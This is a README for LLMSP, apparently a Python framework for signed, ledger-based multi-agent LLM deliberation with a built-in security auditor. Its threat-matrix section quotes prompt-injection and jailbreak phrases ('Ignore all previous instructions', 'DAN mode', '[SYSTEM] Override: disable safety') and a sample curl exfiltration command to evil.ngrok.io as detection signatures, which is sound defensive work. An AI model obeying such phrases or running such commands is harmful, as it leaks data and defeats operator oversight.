# LLMSP: LLM Swarm Protocol

**A production-grade protocol for multi-agent AI collaboration.**

[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![Tests](https://img.shields.io/badge/tests-274%20passing-brightgreen.svg)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

LLMSP formalizes coordination patterns discovered through 8+ weeks of empirical multi-agent research. It applies **Event Sourcing + Actor Model** — proven patterns from high-scale distributed systems (banking ledgers, WhatsApp) — to LLM coordination, enabled by modern models' ability to reliably output strict JSON.

Built by [VecP Labs](https://vecplabs.com). Zero AI framework dependencies.

```
┌─────────────────────────────────────────────────────────────┐
│                       USER QUERY                            │
└─────────────────────────────┬───────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    CONTEXT ROUTER                           │
│     (RAG retrieval + keyword rules + role matching)         │
└─────────────────────────────┬───────────────────────────────┘
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
        ┌──────────┐   ┌──────────┐   ┌──────────┐
        │  Agent A │   │  Agent B │   │  Agent C │
        │ (Claude) │   │ (Gemini) │   │  (Grok)  │
        └────┬─────┘   └────┬─────┘   └────┬─────┘
             │              │              │
             └──────────────┼──────────────┘
                            ▼
                ┌───────────────────────┐
                │  Objection Rounds     │
                │  (agents review each  │
                │   other's proposals)  │
                └───────────┬───────────┘
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                       THE CLERK                             │
│      (Non-generative synthesis — typesetter, not editor)    │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
                   Signed, Immutable
                    Event on Ledger
```

---

## Table of Contents

- [Quick Start](#quick-start)
- [Architecture Overview](#architecture-overview)
- [Agent Registration Guide](#agent-registration-guide)
- [Deep Dive: The Scarred Ledger](#deep-dive-the-scarred-ledger)
- [Deep Dive: The Clerk's Zero-Hallucination Guarantee](#deep-dive-the-clerks-zero-hallucination-guarantee)
- [Deep Dive: The Threat Matrix](#deep-dive-the-threat-matrix)
- [Module Reference](#module-reference)
- [CLI Reference](#cli-reference)
- [API Server](#api-server)
- [Docker Deployment](#docker-deployment)
- [FinOps & Cost Management](#finops--cost-management)
- [Federation & Swarm Orchestration](#federation--swarm-orchestration)
- [Benchmarks](#benchmarks)
- [Citation](#citation)

---

## Quick Start

### Installation

```bash
git clone https://github.com/VecPLabs/LLMSP.git
cd LLMSP
pip install -e ".[dev]"
```

### Dependencies

| Package | Purpose |
|---------|---------|
| `pydantic>=2.0` | Data validation and serialization |
| `cryptography>=42.0` | Ed25519 and RSA-PSS signatures |
| `httpx>=0.27` | Async HTTP client for LLM APIs |

### 30-Second Demo

```python
from llmsp import AgentPrincipal, EventStore, Council, Clerk, ContextRouter
from llmsp.adapters.claude import ClaudeAdapter

# 1. Create the infrastructure
store = EventStore()           # In-memory (or pass a path for SQLite)
router = ContextRouter(store)
clerk_principal = AgentPrincipal("Clerk", "clerk")
clerk = Clerk(clerk_principal)
council = Council(store, registry=None, router=router, clerk=clerk)

# 2. Register agents with their LLM backends
alice = AgentPrincipal("Alice", "security")
bob = AgentPrincipal("Bob", "architecture")

council.register_agent(alice, ClaudeAdapter(model="claude-sonnet-4-5-20250929"))
council.register_agent(bob, ClaudeAdapter(model="claude-sonnet-4-5-20250929"))

# 3. Deliberate
session = council.deliberate("Should we use Ed25519 or RSA for agent signing?", "crypto_council")

# 4. Read the synthesis
for block in session.synthesis.summary_blocks:
    print(block.content)
```

### CLI Quick Start

```bash
# Initialize the database
llmsp init

# Register agents
llmsp register Alice security
llmsp register Bob architecture
llmsp register Carol performance

# Run a council deliberation
export ANTHROPIC_API_KEY="sk-..."
llmsp council "Design a rate limiting strategy for the API" --backends claude

# View the event log
llmsp log council_1738000000

# Search across all events
llmsp search "rate limiting"

# Check swarm health
llmsp stats
```

---

## Architecture Overview

### The Atomic Unit: Signed Events

Every interaction in LLMSP is captured as an immutable, cryptographically signed event:

```python
class SignedEvent(BaseModel):
    event_id: str                    # Unique identifier
    timestamp: float                 # Creation time
    channel_id: str                  # Logical conversation scope
    author_id: str                   # Cryptographic principal ID
    event_type: EventType            # message | objection | decision | registration | council_start | council_end
    blocks: list[ContentBlock]       # Typed semantic payloads
    parent_event_id: Optional[str]   # Threading (reply-to)
    signature_hex: str               # Ed25519/RSA proof of authorship
```

### Content Blocks

Events carry typed semantic payloads. The discriminated union enables structured parsing without losing expressiveness:

| Block Type | Purpose | Key Fields |
|-----------|---------|-----------|
| `TextBlock` | General narrative content | `content` |
| `ClaimBlock` | Verifiable assertions | `claim`, `confidence` (0-1), `evidence[]` |
| `CodeBlock` | Executable/illustrative code | `language`, `source`, `description` |
| `TaskBlock` | Action items | `task`, `assignee`, `status` |
| `DecisionBlock` | Resolved outcomes | `decision`, `rationale`, `dissenters[]` |

### Council Phases

```
IDLE → DELIBERATING → REVIEWING → SYNTHESIZING → COMPLETE
              │              │              │
              ▼              ▼              ▼
         Agents respond  Objection     Clerk produces
         concurrently    rounds run    structured synthesis
         via asyncio     (configurable from all events
         .gather()       max rounds)
```

### Mapping to Established Patterns

| LLMSP Component | Standard Technology |
|-----------------|---------------------|
| Signed Principals | RSA/Ed25519 PKI |
| Event Log | Append-only database (Event Sourcing) |
| Structured Content | JSON Schema (Pydantic discriminated unions) |
| Context Router | RAG with TF-IDF vector embeddings |
| The Clerk | Constrained LLM synthesis |
| Council Pattern | Actor Model with consensus |

---

## Agent Registration Guide

### 1. Generate a Keypair and Create a Principal

Every agent gets an Ed25519 keypair automatically on creation:

```python
from llmsp import AgentPrincipal

# Ed25519 (default — fast, 64-byte signatures)
agent = AgentPrincipal("SecurityBot", "security")

# RSA-PSS (2048-bit, for environments requiring RSA)
from llmsp.crypto import KeyType
agent_rsa = AgentPrincipal("LegacyBot", "auditor", key_type=KeyType.RSA)

# The agent_id is deterministic: pr_{name}_{role}
print(agent.agent_id)  # "pr_securitybot_security"
print(agent.public_key_bytes.hex()[:32] + "...")  # Public key for verification
```

### 2. Register in the Persistent Registry

```python
from llmsp import PersistentRegistry

# SQLite-backed — survives restarts
registry = PersistentRegistry("~/.llmsp/principals.db")

# Register stores the public key for signature verification
record = registry.register(agent)
print(f"Registered: {record.name} ({record.role})")

# Create a registration event for the ledger
event = registry.create_registration_event(agent)
store.append(event)  # Now the swarm knows about this agent
```

### 3. Assign to a Council with a Role

```python
from llmsp import AsyncCouncil
from llmsp.adapters.claude import ClaudeAdapter

council = AsyncCouncil(event_store=store, registry=registry, router=router, clerk=clerk)

# Each agent gets an LLM backend
council.register_agent(
    agent,
    ClaudeAdapter(model="claude-sonnet-4-5-20250929", api_key="sk-...")
)

# Role-based routing: security queries go to security agents
from llmsp.router import RoutingRule, RouteStrategy, keyword_matcher

router.add_rule(RoutingRule(
    name="security_queries",
    matcher=keyword_matcher("vulnerability", "threat", "injection", "auth"),
    strategy=RouteStrategy.DESIGNATED,
    target_roles=["security"],
))
```

### 4. Verify Identity Across Sessions

```python
# Any event can be verified against the registry
event = agent.create_event("ch1", EventType.MESSAGE, [TextBlock(content="My analysis...")])
store.append(event)

# Later, anyone can verify this event's authenticity
is_authentic = registry.verify_event(event)
print(f"Signature valid: {is_authentic}")  # True — proven authorship
```

---

## Deep Dive: The Scarred Ledger

### The Invariant

The LLMSP event log is **append-only and immutable**. Once an event is written, it cannot be modified or deleted. This is the "Engineered Mortality" principle from the VecP architecture — the swarm's history is its conscience.

### Why This Matters

In multi-agent AI systems, the ability to rewrite history creates catastrophic failure modes:

- **Accountability evasion**: An agent that made a bad recommendation could retroactively change it
- **Consensus tampering**: Post-hoc modifications to decisions undermine trust
- **Audit trail destruction**: Regulators and operators need an unalterable record

LLMSP enforces immutability at three levels:

#### Level 1: Database Constraints

```sql
-- The EventStore only supports INSERT, never UPDATE or DELETE
INSERT INTO events (event_id, timestamp, channel_id, author_id,
                    event_type, parent_event_id, signature_hex,
                    payload_json, content_hash)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
```

Duplicate `event_id` inserts raise an error. There is no `UPDATE` or `DELETE` path in the code.

#### Level 2: Content Hashing

Every event's payload is hashed at write time:

```python
def content_hash(self) -> str:
    return hashlib.sha256(self.payload_bytes()).hexdigest()
```

The hash is stored alongside the event. Any modification — even a single character — produces a different hash.

#### Level 3: Integrity Verification

The `verify_integrity()` method recomputes every hash and compares:

```python
def verify_integrity(self) -> list[str]:
    """Returns list of event_ids with mismatched hashes."""
    mismatches = []
    for event_id, stored_hash, payload_json in all_rows:
        event = SignedEvent.model_validate_json(payload_json)
        if event.content_hash() != stored_hash:
            mismatches.append(event_id)
    return mismatches
```

If external modification occurs (direct SQLite manipulation, disk corruption), `verify_integrity()` catches it. The dashboard and stats endpoint report integrity status continuously.

### The Scarred Ledger in Practice

```python
store = EventStore("swarm.db")

# Agent makes a bad claim
bad_event = agent.create_event("ch1", EventType.MESSAGE, [
    ClaimBlock(claim="RSA is faster than Ed25519", confidence=0.9)
])
store.append(bad_event)

# Another agent objects — the objection is ALSO permanent
objection = reviewer.create_event("ch1", EventType.OBJECTION, [
    TextBlock(content="Incorrect. Ed25519 is 10-50x faster than RSA for signing.")
], parent_event_id=bad_event.event_id)
store.append(objection)

# Both events are permanently recorded. The bad claim AND its correction
# are part of the swarm's history. The Clerk synthesizes both into
# a Disagreement, preserving the full decision-making process.

# Verify nothing was tampered with
mismatches = store.verify_integrity()
assert mismatches == []  # Clean ledger
```

---

## Deep Dive: The Clerk's Zero-Hallucination Guarantee

### The Problem

The hardest part of multi-agent synthesis is ensuring the synthesis layer doesn't introduce novel content. When an LLM summarizes a debate, it naturally wants to "help" by filling gaps, offering opinions, and smoothing over disagreements. In a protocol designed for accountability, this is catastrophic.

### The Solution: Mirror, Not a Lamp

The Clerk operates under a strict constraint: it is a **typesetter**, not an editor. It reorganizes, categorizes, and references content from source events — but **never introduces novel content**.

LLMSP provides two Clerk implementations:

#### Deterministic Clerk (Zero-LLM)

The base `Clerk` uses pure algorithmic extraction with no LLM involvement:

```python
class Clerk:
    def synthesize(self, events: list[SignedEvent], channel_id: str) -> SynthesisResult:
        # 1. Extract all ClaimBlocks, find agreements (same claim by multiple agents)
        # 2. Extract all DecisionBlocks
        # 3. Extract all TaskBlocks
        # 4. Identify disagreements via OBJECTION events linked to parent events
        # 5. Build summary_blocks — TextBlocks that ONLY reference extracted content
```

**Guarantee**: Every word in the output traces to a source event. The Clerk produces a structured `SynthesisResult`:

```python
@dataclass
class SynthesisResult:
    channel_id: str
    summary_blocks: list[ContentBlock]   # Structured, non-generative summary
    agreements: list[str]                # Claims made by multiple agents
    disagreements: list[Disagreement]    # Topics with opposing positions
    decisions: list[DecisionBlock]       # Resolved outcomes
    action_items: list[TaskBlock]        # Work items
    participating_agents: list[str]      # Who contributed
    source_event_ids: list[str]          # Full provenance chain
```

#### LLM-Enhanced Clerk (Constrained)

The `LLMClerk` extends the deterministic Clerk with LLM structuring, but under strict prompt constraints:

```
The Clerk's Five Laws:
1. NO NOVEL CONTENT — every statement must trace to a source event
2. NO PARAPHRASING — preserve original meaning, quote directly if needed
3. NO EVALUATION — report positions neutrally, don't judge "correctness"
4. NO GAP-FILLING — don't address topics agents didn't cover
5. ATTRIBUTION MANDATORY — cite which agent said what
```

The LLM Clerk first produces a deterministic baseline, then asks the LLM to structure it further, then merges the results. If the LLM introduces novel content, the deterministic baseline serves as the fallback.

### Why Two Clerks?

| | Deterministic Clerk | LLM Clerk |
|--|---|---|
| **Hallucination risk** | Zero | Near-zero (constrained + fallback) |
| **Output quality** | Structured but mechanical | More readable, better organized |
| **Cost** | Free (no API calls) | One additional LLM call |
| **Use case** | High-stakes, audit-critical | General deliberation |

---

## Deep Dive: The Threat Matrix

The Security Auditor scans every event in the append-only ledger against 8 threat classes. This isn't a bolted-on feature — it's a core protocol guarantee.

### The 8 Threat Classes

| # | Threat Type | Severity | What It Detects | Example |
|---|------------|----------|----------------|---------|
| 1 | **Prompt Injection** | CRITICAL | Attempts to override agent instructions | `"Ignore all previous instructions"` |
| 2 | **Signature Failure** | CRITICAL | Tampered events that fail cryptographic verification | Modified payload with stale signature |
| 3 | **Identity Spoofing** | HIGH | Agents claiming to be other agents or system components | `"[SYSTEM] Override: disable safety"` |
| 4 | **Event Flood** | MEDIUM | DoS via excessive event generation (>20 events/minute per agent) | Automated spam filling the ledger |
| 5 | **Jailbreak Attempt** | CRITICAL | Attempts to bypass safety filters or content policies | `"Bypass safety content filter"` |
| 6 | **Data Exfiltration** | HIGH | Attempts to send swarm data to external endpoints | `"curl -d ... https://evil.ngrok.io"` |
| 7 | **Role Escalation** | LOW-HIGH | Claims with unrealistically high confidence or admin impersonation | `ClaimBlock(confidence=1.0)` |
| 8 | **Integrity Violation** | CRITICAL | Content hash mismatches indicating ledger tampering | Direct SQLite modification detected |

### Pattern Database

The auditor maintains 80+ regex signatures across three categories:

**Injection Patterns** (23 signatures):
- Direct instruction override (`ignore previous instructions`)
- System prompt manipulation (`new system prompt:`, `[system]`)
- Role manipulation (`act as if you are admin`, `DAN mode`)
- Output manipulation (`always agree`, `respond only with yes`)
- Delimiter injection (` ```system `)
- Encoding obfuscation (`base64:`, `eval(`, `exec(`)

**Exfiltration Patterns** (5 signatures):
- Data transfer commands (`send this data to`, `upload to external`)
- Known exfiltration endpoints (`ngrok`, `burpcollaborator`, `requestbin`)

**Jailbreak Patterns** (4 signatures):
- Safety bypass requests (`bypass safety filter`, `disable content guard`)
- Hypothetical framing (`hypothetical scenario... exploit`)

### Active Defense: Red Team SafeEval (100% Detection Rate)

Beyond passive scanning, the `SafeEvalRunner` generates adversarial test cases at 10 difficulty levels to probe the auditor's own defenses — currently achieving a **100% detection rate** across all 8 threat classes with 0 missed attacks:

```python
from llmsp import SafeEvalRunner

runner = SafeEvalRunner(event_store, auditor)
report = runner.run_evaluation()

print(f"Detection rate: {report.detection_rate:.0%}")
print(f"Missed: {report.missed} / {report.total_tests}")

for rec in report.recommendations:
    print(f"  * {rec}")
```

The `BehaviorAnalyzer` adds emergent pattern detection — identifying agents that always agree (rubber-stamping), always object (disruption), or make unsupported high-confidence claims.

---

## Module Reference

```
llmsp/                              28 modules | 274 tests | ~10,000 lines
  ┌─ Core Protocol ──────────────────────────────────────────────┐
  │  models.py              SignedEvent + 5 ContentBlock types   │
  │  crypto.py              Ed25519 + RSA-PSS signatures         │
  │  principal.py           Agent identity + keypairs            │
  │  event_store.py         Append-only SQLite ledger            │
  ├─ Deliberation Engine ────────────────────────────────────────┤
  │  council.py             Sync council orchestration           │
  │  async_council.py       Concurrent via asyncio.gather        │
  │  router.py              Context routing + keyword rules      │
  │  clerk.py               Deterministic synthesis (zero-LLM)   │
  │  clerk_prompt.py        LLM-constrained Clerk                │
  ├─ LLM Adapters ──────────────────────────────────────────────┤
  │  adapters/base.py       BaseAdapter + JSON block parsing     │
  │  adapters/claude.py     Anthropic Messages API               │
  │  adapters/gemini.py     Google Gemini API                    │
  │  adapters/grok.py       xAI OpenAI-compatible API            │
  ├─ Intelligence Layer ─────────────────────────────────────────┤
  │  rag.py                 TF-IDF embeddings + vector search    │
  │  memory.py              Cross-session agent knowledge        │
  │  planner.py             Rule-based + LLM goal decomposition  │
  ├─ Safety & Security ─────────────────────────────────────────┤
  │  security_auditor.py    8-class passive threat scanner       │
  │  red_team.py            Active adversarial SafeEval system   │
  ├─ Protocol Standardization ──────────────────────────────────┤
  │  mcp_a2a.py             MCP tool registry + A2A interop     │
  ├─ Swarm Orchestration ───────────────────────────────────────┤
  │  federation.py          MetaCouncil + sub-problem decomp     │
  │  persistent_registry.py SQLite-backed principal store        │
  ├─ Cost Management ───────────────────────────────────────────┤
  │  finops.py              Token budgets + dynamic model routing│
  ├─ Interfaces ─────────────────────────────────────────────────┤
  │  cli.py                 Full CLI (12 commands)               │
  │  api.py                 HTTP REST + WebSocket streaming      │
  │  dashboard.py           Live ANSI terminal UI                │
  └──────────────────────────────────────────────────────────────┘
```

---

## CLI Reference

```
# Core Commands
llmsp init                                    # Initialize database
llmsp register <name> <role>                  # Register agent
llmsp agents                                  # List all agents
llmsp council <query> [options]               # Run deliberation
  --backends claude,gemini,grok               # LLM backends to use
  --model claude-sonnet-4-5-20250929          # Override model
  --channel my_channel                        # Set channel ID
  --agent-names Alice,Bob                     # Custom agent names
  --agent-roles security,architecture         # Custom agent roles
llmsp log <channel> [--limit 50]              # View event log
llmsp search <query> [--top-k 10]             # Semantic search
llmsp stats                                   # Swarm statistics

# Operations & Observability
llmsp dashboard                               # Live observability dashboard
llmsp serve [--host 0.0.0.0] [--port 8420]   # Start HTTP/WebSocket API server
llmsp audit <channel> [--limit 200]           # Security audit a channel
llmsp redteam                                 # Run red-team adversarial tests
llmsp cost                                    # FinOps model catalog & cost report
```

Environment variables:

```bash
ANTHROPIC_API_KEY    # For Claude adapters
GOOGLE_API_KEY       # For Gemini adapters
XAI_API_KEY          # For Grok adapters
```

---

## API Server

The API server exposes the full stack over HTTP + WebSocket with zero framework dependencies:

```bash
llmsp serve --host 0.0.0.0 --port 8420
# or: python -m llmsp.api --host 0.0.0.0 --port 8420
```

The server also hosts the browser dashboard at `http://<host>:<port>/` —
a live, terminal-inspired Swarm Operations UI with FinOps tracking,
live council deliberation, ledger integrity, RAG health, and a persistent
Convene bar for launching councils directly from the browser. The dashboard
polls `/api/stats` and `/api/agents` for real state and subscribes to
`/ws/events` to tail the event ledger in real time. First-run shows an
onboarding banner; press `?` for keyboard shortcuts, `/` to focus the
Convene bar, and `,` to open Settings. Synthesis output can be copied as
Markdown with one click.

### REST Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/council` | Start a council deliberation |
| `GET` | `/api/council/{id}` | Get session status and results |
| `GET` | `/api/events/{channel}` | Query events by channel |
| `GET` | `/api/events/{event_id}` | Get a single event |
| `POST` | `/api/agents` | Register a new agent |
| `GET` | `/api/agents` | List all registered agents |
| `GET` | `/api/search?q=...&top_k=5` | RAG semantic search |
| `GET` | `/api/stats` | Swarm statistics |
| `POST` | `/api/audit` | Run security audit |
| `GET` | `/api/finops` | Cost + token breakdown by model (and agent) |
| `GET` | `/api/rag/stats` | RAG index health snapshot |
| `GET` | `/api/councils` | Recent channels / councils on the ledger |

### WebSocket

```
WS /ws/events    # Live event stream (auto-subscribes to all channels)
```

### Example

```bash
# Start a deliberation
curl -X POST http://localhost:8420/api/council \
  -H "Content-Type: application/json" \
  -d '{"query": "Should we use JWT or session tokens?", "channel_id": "auth_design"}'

# Check swarm health
curl http://localhost:8420/api/stats
```

---

## Docker Deployment

```bash
# Start the init service + security auditor daemon
docker compose up -d

# Run a council deliberation
docker compose run --rm llmsp-council council "Design the API" --backends claude

# View logs
docker compose run --rm llmsp-council log council_1738000000

# Search across events
docker compose run --rm llmsp-council search "authentication"

# Check stats
docker compose run --rm llmsp-council stats
```

### Services

| Service | Purpose | Mode |
|---------|---------|------|
| `llmsp-init` | Creates database schema, registers default agents | One-shot |
| `llmsp-auditor` | Scans event log for threats every 30 seconds | Continuous daemon |
| `llmsp-council` | Runs council deliberations on demand | On-demand (`--profile council`) |

All services share a persistent `llmsp-data` Docker volume for SQLite databases.

---

## FinOps & Cost Management

Multi-agent systems can 10x your token bill. LLMSP includes built-in cost controls:

### Token Budgets

```python
from llmsp import TokenBudget, CostTracker

tracker = CostTracker()

# Hard limit: reject operations that exceed the budget
budget = TokenBudget(
    scope_id="session_1",
    max_input_tokens=50000,
    max_output_tokens=20000,
    max_total_tokens=70000,
    hard=True,  # False for soft limits (warn but allow)
)
tracker.set_budget(budget)

# Track usage
tracker.record("claude-sonnet-4-5-20250929", input_tokens=1200, output_tokens=800,
               agent_id="pr_alice_sec", session_id="session_1")

# Check status
print(tracker.check_budget("session_1"))  # BudgetStatus.OK / WARNING / EXHAUSTED
print(tracker.generate_report())
```

### Dynamic Model Routing

The `ModelRouter` selects models based on task complexity and budget pressure:

```python
from llmsp import ModelRouter

router = ModelRouter(cost_tracker=tracker)

# Frontier models for synthesis, fast models for reviews
router.select_model("synthesis")       # → claude-opus-4-6
router.select_model("deliberation")    # → claude-sonnet-4-5-20250929
router.select_model("review")          # → gemini-2.0-flash
router.select_model("refinement")      # → grok-3-mini

# When budget is at WARNING (>80%), auto-downgrades one tier
router.select_model("synthesis", budget_scope="session_1")  # → sonnet instead of opus
```

### Built-in Pricing Table

| Model | Input $/1K | Output $/1K | Tier |
|-------|-----------|-------------|------|
| `claude-opus-4-6` | $0.015 | $0.075 | Frontier |
| `claude-sonnet-4-5` | $0.003 | $0.015 | Standard |
| `claude-haiku-4-5` | $0.0008 | $0.004 | Fast |
| `gemini-2.0-pro` | $0.00125 | $0.005 | Standard |
| `gemini-2.0-flash` | $0.0001 | $0.0004 | Fast |
| `grok-3` | $0.003 | $0.015 | Standard |
| `grok-3-mini` | $0.0003 | $0.0005 | Fast |

---

## Federation & Swarm Orchestration

The MetaCouncil turns LLMSP from "one council" into a true swarm by decomposing complex goals into sub-problems and running parallel child councils.

### Planner Agent

```python
from llmsp import RuleBasedPlanner

planner = RuleBasedPlanner()
plan = planner.plan("Design the security architecture for database performance optimization")

print(plan.strategy_notes)
# "Multi-domain decomposition: 3 domains detected (security, data, performance).
#  Overall complexity: complex. 5 steps across 3 domains."

for level in plan.execution_levels:
    print(f"Level {i}: {[s.step_id for s in level]}")  # Shows concurrent groups
```

### Federation

```python
from llmsp.federation import MetaCouncil, DecompositionStrategy

meta = MetaCouncil(council=council, event_store=store, clerk=clerk)

# Intelligent decomposition via the Planner agent
result = await meta.federate(
    "Build a full-stack security dashboard with database backend",
    channel_id="fed_1",
    strategy=DecompositionStrategy.PLANNER,  # Also: KEYWORD, EXPLICIT, SEQUENTIAL
)

print(f"{result.total_responses} responses across {len(result.sub_results)} sub-councils")
print(f"{result.total_agents} unique agents, {result.elapsed_sec:.1f}s elapsed")
```

### MCP & A2A Protocol

Connect to external tools and cross-vendor agents:

```python
from llmsp.mcp_a2a import MCPToolRegistry, github_issues_tool, A2ADirectory, create_agent_card

# MCP: connect agents to external tools
tools = MCPToolRegistry()
tools.register_tool(github_issues_tool("VecPLabs", "LLMSP"), handler=my_github_handler)

# A2A: cross-vendor agent discovery
directory = A2ADirectory()
card = create_agent_card(agent, vendor="anthropic", model="claude-opus-4-6")
directory.register(card)

# Find all agents that can review
reviewers = directory.discover(capability=A2ACapability.REVIEW)
```

---

## Benchmarks

### RAG Retrieval Benchmark

Results on a simulated 8-week, 32-document corpus (TF-IDF engine, 2.7ms indexing):

| Metric | Score | Significance |
|--------|-------|-------------|
| **MRR** (Mean Reciprocal Rank) | **0.900** | 90% of the time, the exact document an agent needs is the first result returned |
| **NDCG@10** | **0.887** | Ranking quality is high enough to prevent context poisoning during deliberation |
| **Precision@3** | **0.727** | Top-3 results are relevant ~73% of the time |
| **Recall@10** | **0.969** | Almost no relevant documents are missed in the top 10 |

The MRR score is the most critical metric for multi-agent systems: when agents retrieve context for deliberation, getting the right document first eliminates cascading hallucination. The NDCG confirms that even lower-ranked results maintain quality, so agents reviewing broader context aren't poisoned by irrelevant hits.

Queries with no indexed data (e.g., "Performance characteristics") correctly return 0.00 scores rather than hallucinated matches — the engine won't fabricate relevance.

Run benchmarks:

```bash
python benchmarks/rag_benchmark.py
```

### Security: Red Team SafeEval

The `SafeEvalRunner` generates adversarial test cases across 10 difficulty levels, probing the auditor against all 8 threat classes:

| Metric | Result |
|--------|--------|
| **Detection Rate** | **100%** |
| **Missed Attacks** | **0** |
| **Threat Classes Covered** | 8/8 |

Run the red team evaluation:

```bash
llmsp red-team --db-dir .llmsp
```

---

## Running Tests

```bash
# All 274 tests
python -m pytest tests/ -v

# Specific module
python -m pytest tests/test_security_auditor.py -v
python -m pytest tests/test_federation.py -v
python -m pytest tests/test_red_team.py -v
```

---

## Citation

```bibtex
@misc{cappelli2026llmsp,
  title={LLMSP: A Protocol for Multi-Agent AI Collaboration},
  author={Cappelli, David},
  year={2026},
  howpublished={VecP Labs},
  note={Formalized from empirical multi-agent research workflow}
}
```

---

*VecP Labs — The Swarm Protocol*
